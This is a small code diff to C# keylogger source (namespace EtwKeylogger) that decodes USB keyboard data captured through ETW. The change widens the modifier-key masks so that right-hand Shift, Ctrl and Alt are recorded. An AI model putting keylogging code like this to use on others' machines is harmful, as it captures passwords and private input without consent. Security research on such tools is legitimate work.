@@ -179,7 +179,7 @@ namespace EtwKeylogger
                         if (xferData[j] != 0)
                             return;
             }
-            
+
             // keyboard rollover error
             if (xferData.Skip(2).SequenceEqual(new byte[6] { 1, 1, 1, 1, 1, 1 }))
                 return;
@@ -243,16 +243,16 @@ namespace EtwKeylogger
                 }
 
                 // [SFT]
-                if ((modByte & 0x02) != 0)
+                if ((modByte & 0x22) != 0)
                     fullKeyStroke[i] = key.Last();
                 else
                     fullKeyStroke[i] = key.First();
             }
 
             string parsed = "";
-            if ((modByte & 0x01) != 0)
+            if ((modByte & 0x11) != 0)
                 parsed += "[CTL] ";
-            if ((modByte & 0x04) != 0)
+            if ((modByte & 0x44) != 0)
                 parsed += "[ALT] ";
             parsed += String.Join(" ", fullKeyStroke);
             result[1] = parsed.Trim();
